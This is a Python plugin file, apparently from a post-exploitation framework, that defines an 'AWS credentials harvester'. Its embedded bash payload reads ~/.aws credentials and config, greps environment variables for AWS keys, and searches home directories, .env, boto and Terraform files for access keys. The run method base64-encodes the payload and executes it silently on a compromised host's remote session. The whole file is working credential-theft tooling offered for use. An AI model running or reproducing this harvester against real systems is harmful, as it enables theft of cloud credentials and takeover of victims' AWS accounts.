"""AWS credentials harvester."""

from ..base import OperatorScript, ScriptResult


class AWSCreds(OperatorScript):
    """Comprehensive AWS credential extraction."""
    
    name = "AWS Credentials"
    description = "Extract AWS credentials from 5+ sources"
    category = "harvest"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] AWS CREDENTIALS HARVESTER"
echo "============================"
echo ""

echo "[1] AWS CLI credentials:"
if [ -f ~/.aws/credentials ]; then
    echo "[!] ~/.aws/credentials found"
    cat ~/.aws/credentials
else
    echo "[-] ~/.aws/credentials not found"
fi
echo ""

echo "[2] AWS CLI config:"
if [ -f ~/.aws/config ]; then
    echo "[!] ~/.aws/config found"
    cat ~/.aws/config
fi
echo ""

echo "[3] Environment variables:"
env | grep -E "AWS_ACCESS_KEY|AWS_SECRET|AWS_SESSION_TOKEN|AWS_PROFILE"
echo ""

echo "[4] AWS credentials in home directories:"
find /home -name "credentials" -path "*/.aws/*" 2>/dev/null | while read file; do
    echo "[!] $file"
    cat "$file" 2>/dev/null
done
echo ""

echo "[5] Searching for hardcoded AWS keys:"
grep -r "AKIA[0-9A-Z]{16}" /home /opt /var/www 2>/dev/null | grep -v "Binary" | head -20
echo ""

echo "[6] AWS keys in environment files:"
find / -name ".env" 2>/dev/null -exec grep -H "AWS_" {} \\; | head -20
echo ""

echo "[7] AWS keys in scripts:"
find /home -name "*.sh" -o -name "*.py" -o -name "*.js" 2>/dev/null -exec grep -l "AKIA\\|aws_access_key" {} \\; | head -10
echo ""

echo "[8] Boto (Python AWS SDK) credentials:"
find / -path "*/.boto" -o -path "*/.aws/boto" 2>/dev/null
echo ""

echo "[9] Terraform AWS credentials:"
find / -name "terraform.tfvars" -o -name "*.tfstate" 2>/dev/null | while read file; do
    echo "[!] $file"
    grep -H "access_key\\|secret_key" "$file" 2>/dev/null
done
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Harvesting AWS credentials...[/bold cyan]")
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            return ScriptResult(success=True, output="AWS credentials harvest executed")
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
